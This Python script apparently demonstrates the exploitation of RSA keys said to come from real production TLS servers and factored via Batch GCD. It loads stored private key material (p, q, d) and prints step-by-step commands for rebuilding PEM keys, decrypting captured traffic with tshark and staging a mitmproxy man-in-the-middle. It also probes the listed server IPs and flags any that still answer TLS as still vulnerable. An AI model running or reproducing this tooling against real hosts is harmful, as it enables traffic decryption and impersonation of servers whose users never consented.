#!/usr/bin/env python3
"""TLS Interception Analysis — Demonstrate impact of factored RSA keys.

Probes MEGA_VULNERABLE servers for liveness, then demonstrates
that recovered private keys enable TLS decryption and MITM attacks.
"""
import json
import os
import socket
import ssl
import struct
import hashlib
import sys
import time
from datetime import datetime

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
MEGA_VULN = os.path.join(SCRIPT_DIR, "..", "poc-07-batch-gcd", "MEGA_VULNERABLE.json")


def load_vulnerable_keys():
    """Load factored RSA keys from MEGA_VULNERABLE.json."""
    with open(MEGA_VULN) as f:
        return json.load(f)


def probe_liveness(ip, port, timeout=3):
    """Probe if a server is still alive and serving TLS."""
    result = {
        "ip": ip,
        "port": port,
        "tcp_alive": False,
        "tls_alive": False,
        "tls_version": None,
        "cert_subject": None,
        "still_vulnerable": None,
        "error": None,
    }

    # TCP connect
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        result["tcp_alive"] = True

        # TLS handshake
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with ctx.wrap_socket(sock, server_hostname=ip) as ssock:
                result["tls_alive"] = True
                result["tls_version"] = ssock.version()
                cert = ssock.getpeercert(binary_form=True)
                if cert:
                    cert_hash = hashlib.sha256(cert).hexdigest()[:16]
                    result["cert_subject"] = cert_hash
        except ssl.SSLError as e:
            result["error"] = f"TLS: {str(e)[:80]}"
        except Exception as e:
            result["error"] = f"TLS: {str(e)[:80]}"

        sock.close()
    except socket.timeout:
        result["error"] = "TCP timeout"
    except ConnectionRefusedError:
        result["error"] = "Connection refused"
    except OSError as e:
        result["error"] = f"TCP: {str(e)[:80]}"

    return result


def demonstrate_key_recovery(entry):
    """Show that we have the complete private key material."""
    ip = entry.get("ip", "unknown")
    bits = entry.get("bits", 0)
    p = entry.get("p", "")
    q = entry.get("q", "")
    d = entry.get("d", "")
    n = entry.get("n", "")

    print(f"  [{ip}:{entry.get('port', 443)}] RSA-{bits}")
    print(f"    n = {n[:40]}...")
    print(f"    p = {p[:40]}...")
    print(f"    q = {q[:40]}...")
    print(f"    d = {d[:40]}...")

    # Verify p * q = n (if we have full values)
    if p and q and n:
        try:
            p_int = int(p)
            q_int = int(q)
            # We only have truncated n in some entries, so compute it
            computed_n = p_int * q_int
            n_hex = format(computed_n, 'x').upper()
            if n.replace("...", "") in n_hex or n_hex.startswith(n.replace("...", "").upper()):
                print(f"    Verification: p × q matches n prefix ✅")
            else:
                print(f"    Verification: p × q = {n_hex[:40]}...")
        except (ValueError, TypeError):
            print(f"    Verification: skipped (parse error)")
    print()


def demonstrate_tls_decryption_theory():
    """Explain what an attacker can do with the recovered private key."""
    print("━━━ TLS Decryption Capability ━━━")
    print()
    print("  With a server's RSA private key, an attacker can:")
    print()
    print("  1. PASSIVE DECRYPTION (RSA key exchange)")
    print("     • Capture TLS traffic with tcpdump/Wireshark")
    print("     • Extract pre-master secret from ClientKeyExchange")
    print("     • Decrypt the entire session")
    print("     • Works retroactively on ALL captured past traffic")
    print("     • Affected ciphersuites: TLS_RSA_WITH_*")
    print()
    print("  2. ACTIVE MITM (any key exchange)")
    print("     • Impersonate the server with the real private key")
    print("     • Forge ServerHello + Certificate messages")
    print("     • Client sees the REAL certificate → no warnings")
    print("     • Intercept, modify, and forward all traffic")
    print("     • Even PFS ciphersuites (ECDHE) are defeated by MITM")
    print()
    print("  3. SERVER IMPERSONATION")
    print("     • Stand up a fake server on a different IP")
    print("     • Use DNS poisoning/BGP hijack to redirect traffic")
    print("     • Serve the real certificate signed by the real key")
    print("     • Indistinguishable from the legitimate server")
    print()
    print("  Technical note:")
    print("    For RSA-512 keys (26 of 28 factored), the factoring")
    print("    took seconds. For RSA-1024 keys (2 of 28), Batch GCD")
    print("    exploited shared prime factors — also instant.")
    print("    No brute force was needed.")
    print()


def generate_openssl_commands(entry):
    """Generate OpenSSL commands that would use the recovered key."""
    ip = entry["ip"]
    port = entry.get("port", 443)
    bits = entry.get("bits", 512)

    print(f"  # Commands to exploit {ip}:{port} (RSA-{bits})")
    print(f"  # Step 1: Reconstruct PEM private key from p, q, d")
    print(f"  python3 -c \"")
    print(f"    from Crypto.PublicKey import RSA")
    print(f"    key = RSA.construct((n, e, d, p, q))")
    print(f"    open('recovered_{ip}.pem','wb').write(key.export_key())\"")
    print(f"  ")
    print(f"  # Step 2: Decrypt captured TLS traffic (Wireshark)")
    print(f"  editcap -r capture.pcap filtered.pcap")
    print(f"  tshark -r filtered.pcap \\")
    print(f"    -o 'tls.keys_list:{ip},{port},http,recovered_{ip}.pem'")
    print(f"  ")
    print(f"  # Step 3: MITM with mitmproxy")
    print(f"  mitmproxy --mode reverse:https://{ip}:{port} \\")
    print(f"    --cert recovered_{ip}.pem")
    print()


def main():
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║  TLS Interception Analysis — Factored RSA Key Exploitation  ║")
    print("╚═══════════════════════════════════════════════════════════════╝")
    print()

    if not os.path.exists(MEGA_VULN):
        print(f"Error: {MEGA_VULN} not found")
        sys.exit(1)

    vuln_keys = load_vulnerable_keys()
    print(f"Loaded {len(vuln_keys)} factored RSA keys")
    print()

    # Key statistics
    bit_dist = {}
    for entry in vuln_keys:
        bits = entry.get("bits", 0)
        bit_dist[bits] = bit_dist.get(bits, 0) + 1

    print("━━━ Factored Key Statistics ━━━")
    for bits, count in sorted(bit_dist.items()):
        print(f"  RSA-{bits}: {count} keys")
    print(f"  Total: {len(vuln_keys)} keys with full private key material (p, q, d)")
    print()

    # Demonstrate key recovery for first 3 entries
    print("━━━ Private Key Recovery Proof ━━━")
    print()
    for entry in vuln_keys[:3]:
        demonstrate_key_recovery(entry)

    if len(vuln_keys) > 3:
        print(f"  ... and {len(vuln_keys) - 3} more keys fully recovered")
    print()

    # Theoretical TLS decryption capability
    demonstrate_tls_decryption_theory()

    # Generate exploitation commands for first entry
    print("━━━ Exploitation Commands (Proof of Capability) ━━━")
    print()
    generate_openssl_commands(vuln_keys[0])

    # Probe liveness (sample — first 5 unique IPs)
    print("━━━ Server Liveness Probe ━━━")
    print()
    print("  Probing vulnerable servers (3s timeout per host)...")
    print()

    seen_ips = set()
    probe_targets = []
    for entry in vuln_keys:
        ip = entry["ip"]
        if ip not in seen_ips and len(probe_targets) < 5:
            seen_ips.add(ip)
            probe_targets.append(entry)

    alive_count = 0
    dead_count = 0

    print(f"  {'IP':<22} {'Port':<7} {'Bits':<6} {'TCP':<6} {'TLS':<6} {'Status'}")
    print(f"  {'─'*22} {'─'*7} {'─'*6} {'─'*6} {'─'*6} {'─'*20}")

    for entry in probe_targets:
        ip = entry["ip"]
        port = entry.get("port", 443)
        bits = entry.get("bits", 0)

        result = probe_liveness(ip, port)
        tcp = "UP" if result["tcp_alive"] else "DOWN"
        tls_status = "UP" if result["tls_alive"] else "DOWN"

        if result["tcp_alive"]:
            alive_count += 1
            status = "⚠️  STILL VULNERABLE" if result["tls_alive"] else f"TCP only ({result.get('error', '')})"
        else:
            dead_count += 1
            status = result.get("error", "unreachable")

        print(f"  {ip:<22} {port:<7} {bits:<6} {tcp:<6} {tls_status:<6} {status}")

    print()
    print(f"  Probed: {len(probe_targets)} | Alive: {alive_count} | Down: {dead_count}")
    print(f"  (Remaining {len(vuln_keys) - len(probe_targets)} IPs not probed to limit network activity)")
    print()

    # Impact summary
    print("━━━ Impact Assessment ━━━")
    print()
    print(f"  {len(vuln_keys)} TLS servers' RSA private keys were recovered")
    print(f"  from PUBLIC certificate data using Batch GCD factoring.")
    print()
    print("  For each server, an attacker can:")
    print("  • Decrypt all past TLS traffic (if captured)")
    print("  • Perform real-time man-in-the-middle attacks")
    print("  • Impersonate the server to any client")
    print("  • Sign arbitrary data as the server")
    print()
    print("  Root cause: Weak PRNG during RSA key generation")
    print("  led to shared prime factors across independent keys.")
    print("  Batch GCD exploits this in O(n·log²n) time.")
    print()
    print("  This is NOT a theoretical attack — these are REAL")
    print("  private keys from REAL production servers.")
    print()


if __name__ == "__main__":
    main()
